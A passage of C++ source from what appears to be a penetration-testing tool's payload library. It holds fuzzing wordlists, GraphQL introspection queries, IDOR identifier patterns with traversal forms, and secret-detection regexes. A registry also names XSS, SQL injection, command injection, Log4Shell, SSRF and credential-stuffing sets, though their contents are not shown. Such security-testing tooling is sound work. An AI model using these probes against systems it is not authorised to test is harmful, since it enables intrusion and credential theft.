    "debug\ntest\nadmin\nrole\nisAdmin\nis_admin\nuser\nusername\nid\nuser_id\naccount_id\ntenant_id\norg_id\ncustomer_id\nsession\nsession_id\ntoken\naccess_token\nauth_token\napi_key\napikey\nkey\nsecret\npassword\npasswd\npwd\nredirect\nredirect_uri\nreturn_url\nnext\nurl\nuri\npath\nfile\nfilename\ndownload\ninclude\ncallback\njsonp\nformat\nfields\nexpand\nfilter\nsort\norder\nlimit\noffset\npage\nsize\nlang\nlocale\ncountry\ncurrency\npreview\ndraft\npublished\nprivate\npublic\ninternal\nexternal\nscope\npermission\npermissions\nfeature\nbeta\nexperiment\nconfig\nmode\nview\ntemplate\ntheme\n"
    ;

static const char* kFuzzCommonHeaders =
    "X-Forwarded-For\nX-Forwarded-Host\nX-Forwarded-Proto\nX-Original-URL\nX-Rewrite-URL\nX-Forwarded-Server\nX-Host\nX-Real-IP\nForwarded\nClient-IP\nTrue-Client-IP\nX-Client-IP\nX-Remote-IP\nX-Remote-Addr\nX-ProxyUser-Ip\nX-Originating-IP\nX-Cluster-Client-IP\nX-HTTP-Method-Override\nX-Method-Override\nX-Original-Method\nX-Api-Version\nX-Version\nX-Debug\nX-Admin\nX-Internal\nX-Requested-With\nOrigin\nReferer\nHost\nAccept\nAccept-Language\nAccept-Encoding\nContent-Type\nAuthorization\nCookie\n"
    ;

static const char* kFuzzContentTypes =
    "application/json\napplication/x-www-form-urlencoded\nmultipart/form-data\ntext/plain\ntext/xml\napplication/xml\napplication/graphql\napplication/graphql+json\napplication/x-ndjson\napplication/json-patch+json\napplication/merge-patch+json\napplication/octet-stream\ntext/html\ntext/javascript\napplication/javascript\napplication/yaml\napplication/x-yaml\n"
    ;

static const char* kGraphqlFields =
    "__typename\n__schema\n__type\nid\nnode\nnodes\nedges\npageInfo\nuser\nusers\nviewer\nme\naccount\naccounts\norganization\norganizations\ntenant\ntenants\nadmin\nadmins\nrole\nroles\npermission\npermissions\ntoken\ntokens\napiKey\napiKeys\nsecret\nsecrets\npassword\nemail\nprofile\nsettings\nconfig\nmetadata\ncreatedAt\nupdatedAt\ndeletedAt\nowner\nbalance\namount\nprice\norder\norders\ninvoice\ninvoices\npayment\npayments\n"
    ;

static const char* kGraphqlOperations =
    "query { __typename }\n"
    "query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { name kind } } }\n"
    "query AiDAType($name:String!) { __type(name:$name) { name kind fields { name type { name kind ofType { name kind } } args { name type { name kind ofType { name kind } } } } } }\n"
    "query AiDANode($id:ID!) { node(id:$id) { id __typename } }\n"
    "query AiDAViewer { viewer { id __typename } }\n"
    "mutation AiDAProbe($aidaValue:String) { __typename }\n"
    "query AiDADepth { __typename }\n"
    ;

static const char* kIdorIdPatterns =
    "1\n2\n3\n4\n5\n10\n11\n12\n99\n100\n101\n999\n1000\n1001\n1234\n12345\n123456\n0001\n0002\n0003\n00000001\n00000002\n-1\n0\n01\n02\n10\nff\nffffffff\n00000000-0000-0000-0000-000000000000\n11111111-1111-1111-1111-111111111111\n550e8400-e29b-41d4-a716-446655440000\n../1\n..%2f1\n%2e%2e%2f1\nadmin\nroot\nme\nself\ncurrent\nlatest\n"
    ;

static const char* kJsSecretsPatterns =
    "(?i)(api[_-]?key|apikey|secret|token|password|passwd|pwd)\\s*[:=]\\s*['\\\"][A-Za-z0-9._~+/=-]{12,}['\\\"]\n"
    "AKIA[0-9A-Z]{16}\n"
    "ASIA[0-9A-Z]{16}\n"
    "ghp_[A-Za-z0-9_]{36,}\n"
    "github_pat_[A-Za-z0-9_]{80,}\n"
    "glpat-[A-Za-z0-9_-]{20,}\n"
    "xox[baprs]-[A-Za-z0-9-]{10,}\n"
    "sk_live_[A-Za-z0-9]{20,}\n"
    "sk_test_[A-Za-z0-9]{20,}\n"
    "AIza[0-9A-Za-z_-]{35}\n"
    "ya29\\.[0-9A-Za-z_-]{40,}\n"
    "eyJ[A-Za-z0-9_-]{10,}\\.[A-Za-z0-9_-]{10,}\\.[A-Za-z0-9_-]{10,}\n"
    "-----BEGIN [A-Z ]*PRIVATE KEY-----\n"
    ;

struct builtin_def_t
{
    const char* id;
    const char* label;
    const char* description;
    const char* blob;
};

static const builtin_def_t kBuiltins[] = {
    { "xss/polyglot", "XSS Polyglot", "Polyglot XSS payloads that work in many contexts at once.", kXssPolyglot },
    { "xss/standard", "XSS Standard", "Standard reflected/stored XSS payload corpus.", kXssStandard },
    { "sqli/error", "SQLi Error-Based", "Payloads that trigger SQL errors across common dialects.", kSqliError },
    { "sqli/boolean", "SQLi Boolean-Based", "True/false pairs for boolean-blind SQL injection.", kSqliBoolean },
    { "sqli/time", "SQLi Time-Based", "Sleep-based payloads for time-blind SQL injection.", kSqliTime },
    { "cmdi/unix", "Command Injection - Unix", "Unix command-injection payloads with separators and substitutions.", kCmdiUnix },
    { "cmdi/windows", "Command Injection - Windows", "Windows cmd/PowerShell command-injection payloads.", kCmdiWindows },
    { "lfi/unix", "LFI - Unix", "Local file inclusion / path traversal payloads for *nix targets.", kLfiUnix },
    { "lfi/windows", "LFI - Windows", "Local file inclusion / path traversal payloads for Windows targets.", kLfiWindows },
    { "rce/log4j", "RCE - Log4Shell", "Log4j JNDI lookup payload variants for CVE-2021-44228.", kRceLog4j },
    { "rce/spring", "RCE - Spring", "Spring/SpEL/OGNL RCE payload set.", kRceSpring },
    { "rce/struts", "RCE - Struts", "Apache Struts OGNL RCE payload set.", kRceStruts },
    { "ssrf/cloud", "SSRF - Cloud Metadata", "Cloud metadata service URLs (AWS/GCP/Azure/Alibaba/DigitalOcean/OpenStack).", kSsrfCloud },
    { "ssrf/loopback", "SSRF - Loopback", "Loopback bypass payloads (127.0.0.1, [::1], decimal/hex/octal forms).", kSsrfLoopback },
    { "ssti/all-engines", "SSTI - All Engines", "Server-side template injection payloads for Jinja/Twig/Velocity/Freemarker/Smarty/Handlebars/ERB.", kSstiAll },
    { "auth/usernames-top1000", "Usernames - Top", "Common usernames for credential-stuffing and login brute.", kAuthUsernamesTop1000 },
    { "auth/passwords-top1000", "Passwords - Top", "Common passwords for credential-stuffing.", kAuthPasswordsTop1000 },
    { "dirs/common-100", "Directories - Common 100", "Top 100 directory/file names for content discovery.", kDirsCommon100 },
    { "dirs/quickhits", "Directories - Quick Hits", "High-value low-volume hits (configs, dotfiles, dumps).", kDirsQuickhits },
    { "dirs/big", "Directories - Big", "Wider directory and file wordlist for content discovery.", kDirsBig },
    { "subdomains/top1000", "Subdomains - Top", "Top subdomain labels for brute-force enumeration.", kSubdomainsTop1000 },
    { "fuzzdb/extensions", "File Extensions", "File extensions for content-discovery extension mode.", kFuzzdbExtensions },
    { "headers/security-headers", "HTTP Security Headers", "Names of security-related HTTP response headers.", kHeadersSec },
    { "sqli/error_based", "SQLi Error-Based Expanded", "Expanded SQL error trigger payloads used by offensive SQLi workflows.", kSqliErrorBased },
    { "sqli/boolean_true", "SQLi Boolean True", "Boolean-blind true-side SQL injection payloads.", kSqliBooleanTrue },
    { "sqli/boolean_false", "SQLi Boolean False", "Boolean-blind false-side SQL injection payloads.", kSqliBooleanFalse },
    { "sqli/union_based", "SQLi Union-Based", "UNION and ORDER BY discovery payloads for column-count and data extraction probes.", kSqliUnionBased },
    { "sqli/time_based", "SQLi Time-Based Expanded", "Time-delay SQL injection payloads across MySQL, PostgreSQL, SQL Server, Oracle, and SQLite.", kSqliTimeBased },
    { "sqli/waf_bypass", "SQLi WAF Bypass", "Encoding, casing, comments, and operator variants for SQLi filter bypass testing.", kSqliWafBypass },
    { "sqli/db_fingerprint", "SQLi DB Fingerprint", "Database metadata expressions for backend fingerprinting through confirmed SQLi.", kSqliDbFingerprint },
    { "xss/html_context", "XSS HTML Context", "HTML body-context XSS payloads.", kXssHtmlContext },
    { "xss/attribute_context", "XSS Attribute Context", "Attribute-breakout XSS payloads.", kXssAttributeContext },
    { "xss/script_context", "XSS Script Context", "JavaScript string and script-context XSS payloads.", kXssScriptContext },
    { "xss/url_context", "XSS URL Context", "URL, href, redirect, and data-URI XSS payloads.", kXssUrlContext },
    { "xss/polyglot_expanded", "XSS Polyglot Expanded", "Expanded cross-context XSS polyglots.", kXssPolyglotExpanded },
    { "xss/csp_bypass", "XSS CSP Bypass", "Payloads that exercise CSP bypass candidates without changing browser policy.", kXssCspBypass },
    { "xss/waf_bypass", "XSS WAF Bypass", "Encoded and syntax-mutated XSS payloads for filter bypass testing.", kXssWafBypass },
    { "auth/usernames_common_expanded", "Auth Usernames Expanded", "Expanded common username corpus for bounded auth testing.", kAuthUsernamesCommonExpanded },
    { "auth/passwords_common_expanded", "Auth Passwords Expanded", "Expanded common password corpus for bounded auth testing.", kAuthPasswordsCommonExpanded },
    { "auth/passwords_rockyou", "RockYou Passwords Curated", "Curated high-frequency RockYou-compatible password corpus for bounded credential tests.", kAuthPasswordsRockyou },
    { "ssrf/internal_urls", "SSRF Internal URLs", "Internal, loopback, private-network, and scheme-bypass SSRF targets.", kSsrfInternalUrls },
    { "ssrf/cloud_metadata_expanded", "SSRF Cloud Metadata Expanded", "Expanded cloud metadata URLs across AWS, Azure, GCP, Alibaba, Oracle, DigitalOcean, and OpenStack.", kSsrfCloudMetadataExpanded },
    { "ssti/jinja2", "SSTI Jinja2", "Jinja2 and Flask template injection probes.", kSstiJinja2 },
    { "ssti/twig", "SSTI Twig", "Twig template injection probes.", kSstiTwig },
    { "ssti/freemarker", "SSTI Freemarker", "Freemarker template injection probes.", kSstiFreemarker },
    { "ssti/velocity", "SSTI Velocity", "Apache Velocity template injection probes.", kSstiVelocity },
    { "ssti/smarty", "SSTI Smarty", "Smarty template injection probes.", kSstiSmarty },
    { "ssti/detect", "SSTI Detection", "Cross-engine arithmetic and syntax probes for SSTI detection.", kSstiDetect },
    { "cmdi/unix_advanced", "Command Injection Unix Advanced", "Unix command-injection payloads with separators, substitutions, time probes, and bypass forms.", kCmdiUnixAdvanced },
    { "cmdi/windows_advanced", "Command Injection Windows Advanced", "Windows command-injection payloads for cmd and PowerShell contexts.", kCmdiWindowsAdvanced },
    { "cmdi/filter_bypass", "Command Injection Filter Bypass", "Encoded and metacharacter-mutated command injection payloads.", kCmdiFilterBypass },
    { "path_traversal/unix_advanced", "Path Traversal Unix Advanced", "Unix file-read and wrapper traversal payloads.", kPathTraversalUnixAdvanced },
    { "path_traversal/windows_advanced", "Path Traversal Windows Advanced", "Windows file-read traversal payloads.", kPathTraversalWindowsAdvanced },
    { "path_traversal/encoding_bypass", "Path Traversal Encoding Bypass", "Encoded, double-encoded, mixed-separator, and null-byte traversal payloads.", kPathTraversalEncodingBypass },
    { "xxe/oob", "XXE OOB", "Out-of-band XML external entity payload templates using the AIDA_OOB marker.", kXxeOob },
    { "xxe/error_based", "XXE Error-Based", "In-band file-read and parser-error XXE payloads.", kXxeErrorBased },
    { "xxe/ssrf", "XXE SSRF", "XXE payloads that target metadata and internal HTTP endpoints.", kXxeSsrf },
    { "smuggling/cl_te", "HTTP Smuggling CL.TE", "Conflicting Content-Length and Transfer-Encoding request templates.", kSmugglingClTe },
    { "smuggling/te_cl", "HTTP Smuggling TE.CL", "Transfer-Encoding then Content-Length smuggling request templates.", kSmugglingTeCl },
    { "smuggling/te_te", "HTTP Smuggling TE.TE", "Ambiguous duplicated Transfer-Encoding request templates.", kSmugglingTeTe },
    { "fuzz/common_params", "Fuzz Common Parameters", "Common query, body, auth, pagination, and feature-flag parameter names.", kFuzzCommonParams },
    { "params/common", "Parameters Common", "Compatibility alias for common web parameter mining names.", kFuzzCommonParams },
    { "fuzz/common_headers", "Fuzz Common Headers", "Common request headers used for active API and proxy differential testing.", kFuzzCommonHeaders },
    { "fuzz/content_types", "Fuzz Content Types", "Common API and web content types for parser behavior testing.", kFuzzContentTypes },
    { "fuzz/dir_small", "Fuzz Directories Small", "Small high-signal directory discovery corpus.", kDirsCommon100 },
    { "fuzz/dir_medium", "Fuzz Directories Medium", "Medium high-value content discovery corpus.", kDirsQuickhits },
    { "fuzz/dir_big", "Fuzz Directories Big", "Large web content discovery corpus.", kDirsBig },
    { "graphql/fields", "GraphQL Fields", "Common GraphQL field names for schema review and resolver probing.", kGraphqlFields },
    { "graphql/operations", "GraphQL Operations", "Bounded GraphQL operation templates for offensive API checks.", kGraphqlOperations },
    { "idor/id_patterns", "IDOR Identifier Patterns", "Common numeric, UUID, keyword, and traversal-adjacent object identifiers.", kIdorIdPatterns },
    { "js/secrets_patterns", "JavaScript Secret Regex Patterns", "Regex corpus for redacted JavaScript secret detection.", kJsSecretsPatterns },
};

}

std::string storage_dir()
{
    diag::log_tagged_fmt("payload", "storage_dir entry");
    PWSTR known = nullptr;
    std::string base;
    if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, nullptr, &known)) && known)
    {
        const int needed = WideCharToMultiByte(CP_UTF8, 0, known, -1, nullptr, 0, nullptr, nullptr);
        if (needed > 1)
        {
            base.assign(static_cast<size_t>(needed - 1), '\0');
            WideCharToMultiByte(CP_UTF8, 0, known, -1, base.data(), needed, nullptr, nullptr);
        }
        CoTaskMemFree(known);
    }
    if (base.empty()) {
        diag::log_tagged_fmt("payload", "storage_dir appdata_fallback");
        base = "C:\\Users\\Public";
    }
    base += "\\AiDA\\Standalone\\burp\\payloads\\";
    std::error_code ec;
    std::filesystem::create_directories(base, ec);
    diag::log_tagged_fmt("payload", "storage_dir result=%s", base.c_str());
    return base;
}

bool initialize()
{
    diag::log_tagged_fmt("payload", "initialize entry");
    auto& st = s();
    bool expected = false;
    if (!st.initialized.compare_exchange_strong(expected, true)) {
        diag::log_tagged_fmt("payload", "initialize already_initialized");
        return true;
    }

    std::lock_guard<std::mutex> lk(st.mtx);
    size_t builtin_count = 0;
    for (const auto& b : kBuiltins)
    {
        payload_set_t p;
        p.id          = b.id;
        p.label       = b.label;
        p.description = b.description;
        p.builtin     = true;
        p.entries     = split_lines(b.blob);
        diag::log_tagged_fmt("payload", "initialize builtin id=%s entries=%zu", b.id, p.entries.size());
        st.sets[p.id] = std::move(p);
        ++builtin_count;
    }
    diag::log_tagged_fmt("payload", "initialize builtins_loaded count=%zu", builtin_count);

    std::error_code ec;
    const std::string dir = storage_dir();
    if (std::filesystem::exists(dir, ec))
    {
        diag::log_tagged_fmt("payload", "initialize scanning_custom_dir dir=%s", dir.c_str());
        size_t custom_count = 0;
        for (auto it = std::filesystem::directory_iterator(dir, ec); !ec && it != std::filesystem::directory_iterator(); ++it)
        {
            if (!it->is_regular_file()) continue;
            std::string fname = it->path().filename().string();
            if (fname.size() < 5 || fname.substr(fname.size() - 4) != ".txt") continue;
            std::string id = fname.substr(0, fname.size() - 4);
            std::replace(id.begin(), id.end(), '_', '/');

            std::ifstream f(it->path(), std::ios::binary);
            if (!f) {
                diag::log_tagged_fmt("payload", "initialize custom_open_failed file=%s", fname.c_str());
                continue;
            }
            std::ostringstream oss;
            oss << f.rdbuf();
            const std::string blob = oss.str();
            std::vector<std::string> lines;
            std::string cur;
            for (char c : blob)
            {
                if (c == '\n') { if (!cur.empty()) lines.push_back(cur); cur.clear(); }
                else if (c != '\r') cur.push_back(c);
            }
            if (!cur.empty()) lines.push_back(cur);

            payload_set_t p;
            p.id          = id;
            p.label       = id;
            p.description = "Custom set loaded from disk.";
            p.builtin     = false;
            p.entries     = std::move(lines);

            auto exist = st.sets.find(id);
            if (exist == st.sets.end() || !exist->second.builtin) {
                diag::log_tagged_fmt("payload", "initialize custom_loaded id=%s entries=%zu", id.c_str(), p.entries.size());
                st.sets[id] = std::move(p);
                ++custom_count;
            }
        }
        diag::log_tagged_fmt("payload", "initialize custom_sets_loaded count=%zu", custom_count);
    }
    else
    {
        diag::log_tagged_fmt("payload", "initialize custom_dir_not_found dir=%s", dir.c_str());
    }
    diag::log_tagged_fmt("burp.payloads", "initialize sets=%zu", st.sets.size());
    diag::log_tagged_fmt("payload", "initialize done total_sets=%zu", st.sets.size());
    return true;
}

void shutdown()
{
    diag::log_tagged_fmt("payload", "shutdown entry");
    auto& st = s();
    if (!st.initialized.exchange(false)) {
        diag::log_tagged_fmt("payload", "shutdown not_initialized skip");
        return;
    }
    size_t prev = 0;
    {
        std::lock_guard<std::mutex> lk(st.mtx);
        prev = st.sets.size();
        st.sets.clear();
    }
    diag::log_tagged_fmt("payload", "shutdown done cleared=%zu", prev);
}

const payload_set_t* get(const std::string& id)
{
    diag::log_tagged_fmt("payload", "get entry id=%s", id.c_str());
    auto& st = s();
    std::lock_guard<std::mutex> lk(st.mtx);
    auto it = st.sets.find(id);
    if (it == st.sets.end()) {
        diag::log_tagged_fmt("payload", "get not_found id=%s", id.c_str());
        return nullptr;
    }
    diag::log_tagged_fmt("payload", "get found id=%s entries=%zu builtin=%d", id.c_str(), it->second.entries.size(), it->second.builtin ? 1 : 0);
    return &it->second;
}

std::vector<std::string> list_ids()
{
    diag::log_tagged_fmt("payload", "list_ids entry");
    auto& st = s();
    std::vector<std::string> out;
    std::lock_guard<std::mutex> lk(st.mtx);
    out.reserve(st.sets.size());
    for (auto& kv : st.sets) out.push_back(kv.first);
    std::sort(out.begin(), out.end());
    diag::log_tagged_fmt("payload", "list_ids result count=%zu", out.size());
    return out;
}

std::vector<payload_set_t> list_summaries()
{
    diag::log_tagged_fmt("payload", "list_summaries entry");
    auto& st = s();
    std::vector<payload_set_t> out;
    std::lock_guard<std::mutex> lk(st.mtx);
    out.reserve(st.sets.size());
    for (auto& kv : st.sets)
    {
        payload_set_t cp;
        cp.id          = kv.second.id;
        cp.label       = kv.second.label;
        cp.description = kv.second.description;
        cp.builtin     = kv.second.builtin;
        cp.entries.clear();
        out.push_back(std::move(cp));
    }
    std::sort(out.begin(), out.end(), [](const payload_set_t& a, const payload_set_t& b) { return a.id < b.id; });
    diag::log_tagged_fmt("payload", "list_summaries result count=%zu", out.size());
    return out;
}

std::vector<std::string> entries(const std::string& id, size_t max_count)
{
    diag::log_tagged_fmt("payload", "entries entry id=%s max_count=%zu", id.c_str(), max_count);
    auto& st = s();
    std::lock_guard<std::mutex> lk(st.mtx);
    auto it = st.sets.find(id);
    if (it == st.sets.end()) {
        diag::log_tagged_fmt("payload", "entries not_found id=%s", id.c_str());
        return {};
    }
    size_t total = it->second.entries.size();
    if (max_count == 0 || max_count >= total) {
        diag::log_tagged_fmt("payload", "entries returning_all id=%s count=%zu", id.c_str(), total);
        return it->second.entries;
    }
    diag::log_tagged_fmt("payload", "entries returning_slice id=%s count=%zu of %zu", id.c_str(), max_count, total);
    return std::vector<std::string>(it->second.entries.begin(), it->second.entries.begin() + max_count);
}

std::vector<std::string> search(const std::string& query, const std::string& set_id)
{
    diag::log_tagged_fmt("payload", "search entry query=%s set_id=%s", query.c_str(), set_id.c_str());
    std::vector<std::string> out;
    if (query.empty()) {
        diag::log_tagged_fmt("payload", "search empty_query");
        return out;
    }
    auto& st = s();
    std::string ql = query;
    std::transform(ql.begin(), ql.end(), ql.begin(), [](unsigned char c){ return static_cast<char>(std::tolower(c)); });

    std::lock_guard<std::mutex> lk(st.mtx);
    auto check_set = [&](const payload_set_t& p) {
        for (const auto& e : p.entries)
        {
            std::string el = e;
            std::transform(el.begin(), el.end(), el.begin(), [](unsigned char c){ return static_cast<char>(std::tolower(c)); });
            if (el.find(ql) != std::string::npos)
                out.push_back(e);
        }
    };
    if (set_id.empty())
    {
        diag::log_tagged_fmt("payload", "search scanning_all_sets sets=%zu", st.sets.size());
        for (auto& kv : st.sets) check_set(kv.second);
    }
    else
    {
        auto it = st.sets.find(set_id);
        if (it == st.sets.end()) {
            diag::log_tagged_fmt("payload", "search set_not_found set_id=%s", set_id.c_str());
            return out;
        }
        diag::log_tagged_fmt("payload", "search scanning_set set_id=%s", set_id.c_str());
        check_set(it->second);
    }
    diag::log_tagged_fmt("payload", "search result count=%zu query=%s", out.size(), query.c_str());
    return out;
}

bool add_custom_set(const std::string& id, const std::string& label, const std::string& description, const std::vector<std::string>& entries_in)
{
    diag::log_tagged_fmt("payload", "add_custom_set entry id=%s label=%s entries=%zu", id.c_str(), label.c_str(), entries_in.size());
    if (id.empty())
    {
        diag::log_tagged_fmt("payload", "add_custom_set empty_id");
        set_err("empty id");
        return false;
    }
    auto& st = s();
    {
        std::lock_guard<std::mutex> lk(st.mtx);
        auto it = st.sets.find(id);
        if (it != st.sets.end() && it->second.builtin)
        {
            diag::log_tagged_fmt("payload", "add_custom_set override_builtin_denied id=%s", id.c_str());
            set_err("cannot override built-in id");
            return false;
        }
        payload_set_t p;
        p.id          = id;
        p.label       = label.empty() ? id : label;
        p.description = description;
        p.builtin     = false;
        p.entries     = entries_in;
        st.sets[id] = std::move(p);
        diag::log_tagged_fmt("payload", "add_custom_set inserted id=%s total_sets=%zu", id.c_str(), st.sets.size());
    }
    bool saved = export_to_file(storage_path_for(id), id);
    diag::log_tagged_fmt("payload", "add_custom_set saved=%d id=%s", saved ? 1 : 0, id.c_str());
    return saved;
}

bool remove_custom_set(const std::string& id)
{
    diag::log_tagged_fmt("payload", "remove_custom_set entry id=%s", id.c_str());
    auto& st = s();
    {
        std::lock_guard<std::mutex> lk(st.mtx);
        auto it = st.sets.find(id);
        if (it == st.sets.end())
        {
            diag::log_tagged_fmt("payload", "remove_custom_set not_found id=%s", id.c_str());
            set_err("not found");
            return false;
        }
        if (it->second.builtin)
        {
            diag::log_tagged_fmt("payload", "remove_custom_set remove_builtin_denied id=%s", id.c_str());
            set_err("cannot remove built-in");
            return false;
        }
        st.sets.erase(it);
        diag::log_tagged_fmt("payload", "remove_custom_set erased id=%s remaining=%zu", id.c_str(), st.sets.size());
    }
    std::error_code ec;
    std::string fpath = storage_path_for(id);
    std::filesystem::remove(fpath, ec);
    diag::log_tagged_fmt("payload", "remove_custom_set file_removed path=%s ec=%s", fpath.c_str(), ec.message().c_str());
    return true;
}

bool load_from_file(const std::string& path, const std::string& id)
{
    diag::log_tagged_fmt("payload", "load_from_file entry path=%s id=%s", path.c_str(), id.c_str());
    if (id.empty())
    {
        diag::log_tagged_fmt("payload", "load_from_file empty_id");
        set_err("empty id");
        return false;
    }
    std::ifstream f(path, std::ios::binary);
    if (!f)
    {
        diag::log_tagged_fmt("payload", "load_from_file open_failed path=%s", path.c_str());
        set_err("open failed");
        return false;
    }
    std::vector<std::string> lines;
    std::string ln;
    while (std::getline(f, ln))
    {
        while (!ln.empty() && (ln.back() == '\r' || ln.back() == '\n')) ln.pop_back();
        if (!ln.empty()) lines.push_back(ln);
    }
    diag::log_tagged_fmt("payload", "load_from_file parsed lines=%zu id=%s", lines.size(), id.c_str());
    bool ok = add_custom_set(id, id, "Loaded from " + path, lines);
    diag::log_tagged_fmt("payload", "load_from_file result=%d id=%s", ok ? 1 : 0, id.c_str());
    return ok;
}

bool export_to_file(const std::string& path, const std::string& id)
{
    diag::log_tagged_fmt("payload", "export_to_file entry id=%s path=%s", id.c_str(), path.c_str());
    auto& st = s();
    std::vector<std::string> snapshot;
    {
        std::lock_guard<std::mutex> lk(st.mtx);
        auto it = st.sets.find(id);
        if (it == st.sets.end())
        {
            diag::log_tagged_fmt("payload", "export_to_file not_found id=%s", id.c_str());
            set_err("not found");
            return false;
        }
        snapshot = it->second.entries;
    }
    diag::log_tagged_fmt("payload", "export_to_file snapshot_count=%zu id=%s", snapshot.size(), id.c_str());
    std::filesystem::path p(path);
    std::error_code ec;
    std::filesystem::create_directories(p.parent_path(), ec);
    std::ofstream f(p, std::ios::binary | std::ios::trunc);
    if (!f)
    {
        diag::log_tagged_fmt("payload", "export_to_file open_failed path=%s", path.c_str());
        set_err("open for write failed");
        return false;
    }
    for (const auto& e : snapshot)
    {
        f.write(e.data(), static_cast<std::streamsize>(e.size()));
        f.put('\n');
    }
    diag::log_tagged_fmt("payload", "export_to_file ok id=%s entries=%zu path=%s", id.c_str(), snapshot.size(), path.c_str());
    return true;
}

bool set_exists(const std::string& id)
{
    diag::log_tagged_fmt("payload", "set_exists entry id=%s", id.c_str());
    auto& st = s();
    std::lock_guard<std::mutex> lk(st.mtx);
    bool found = st.sets.find(id) != st.sets.end();
    diag::log_tagged_fmt("payload", "set_exists id=%s result=%d", id.c_str(), found ? 1 : 0);
    return found;
}

std::string last_error()
{
    diag::log_tagged_fmt("payload", "last_error queried");
    auto& st = s();
    std::lock_guard<std::mutex> lk(st.err_mtx);
    diag::log_tagged_fmt("payload", "last_error=%s", st.last_err.c_str());
    return st.last_err;
}

}
}
}
